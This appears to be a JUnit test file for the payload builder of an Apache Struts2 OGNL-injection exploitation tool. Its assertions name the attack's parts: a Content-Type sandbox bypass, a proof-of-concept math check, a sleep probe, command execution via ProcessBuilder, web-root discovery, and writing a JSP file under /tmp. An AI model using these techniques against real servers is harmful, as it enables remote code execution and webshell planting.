package com.s2tool.core;

import org.junit.Test;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

/**
 * PayloadBuilder 单元测试：验证 payload 结构与关键特征。
 */
public class PayloadBuilderTest {

    @Test
    public void testWrapContentType() {
        String ct = PayloadBuilder.wrapContentType("(#a=1)");
        assertEquals("%{(#a=1)}", ct);
    }

    @Test
    public void testSanboxBypassContainsMimeFake() {
        // 关键特征：payload 必须包含 'multipart/form-data' 字面量以通过 Struts contains 检查
        assertTrue(PayloadBuilder.SANDBOX_BYPASS.contains("multipart/form-data"));
    }

    @Test
    public void testSanboxBypassContainsDefaultMemberAccess() {
        assertTrue(PayloadBuilder.SANDBOX_BYPASS.contains("ognl.OgnlContext@DEFAULT_MEMBER_ACCESS"));
    }

    @Test
    public void testMathValidationPayload() {
        String ct = PayloadBuilder.mathValidationPayload();
        assertTrue(ct.startsWith("%{"));
        assertTrue(ct.endsWith("}"));
        // 公开 POC 算式与期望结果
        assertTrue(ct.contains(PayloadBuilder.MATH_EXPR));
        assertEquals("88866777", PayloadBuilder.MATH_RESULT);
        // 必须包含 close() 以刷新 Writer 缓冲
        assertTrue(ct.contains("(#o.close())"));
        assertTrue(ct.contains("println(" + PayloadBuilder.MATH_EXPR + ")"));
    }

    @Test
    public void testMarkerPayload() {
        String uuid = PayloadBuilder.randomUuid();
        String ct = PayloadBuilder.markerPayload(uuid);
        assertTrue(ct.contains(uuid));
        assertTrue(ct.contains("(#o.close())"));
    }

    @Test
    public void testSleepPayload() {
        String ct = PayloadBuilder.sleepPayload(5000);
        assertTrue(ct.contains("Thread@sleep(5000)"));
    }

    @Test
    public void testCommandPayload() {
        String ct = PayloadBuilder.commandPayload("id");
        assertTrue(ct.contains("ProcessBuilder"));
        assertTrue(ct.contains("redirectErrorStream"));
        assertTrue(ct.contains("IOUtils@copy"));
        assertTrue(ct.contains("URLDecoder@decode"));
        // 命令经过 URL 编码，不应出现裸空格
        assertFalse(ct.contains("(#cmd='id')"));
    }

    @Test
    public void testCommandPayloadSpecialChars() {
        // 含引号和特殊字符的命令不应破坏表达式
        String ct = PayloadBuilder.commandPayload("echo 'a b' | base64");
        assertTrue(ct.contains("URLDecoder@decode"));
    }

    @Test
    public void testWebRootPayload() {
        String ct = PayloadBuilder.webRootPayload();
        assertTrue(ct.contains("getRealPath"));
        assertTrue(ct.contains("getWriter"));
    }

    @Test
    public void testWriteFilePayload() {
        String ct = PayloadBuilder.writeFilePayload("/tmp/x.jsp", "aGVsbG8=");
        assertTrue(ct.contains("Base64@getDecoder"));
        assertTrue(ct.contains("FileOutputStream"));
        assertTrue(ct.contains("S2TOOL_WRITE_OK"));
    }

    @Test
    public void testRandomUuid() {
        String u1 = PayloadBuilder.randomUuid();
        String u2 = PayloadBuilder.randomUuid();
        assertNotNull(u1);
        assertEquals(32, u1.length());
        assertFalse(u1.equals(u2));
    }

    @Test
    public void testMathResultCorrect() {
        // 校验公开 POC 算式计算结果
        long result = 88888888L - 23333 + 1222;
        assertEquals("88866777", String.valueOf(result));
        assertEquals(String.valueOf(result), PayloadBuilder.MATH_RESULT);
    }
}
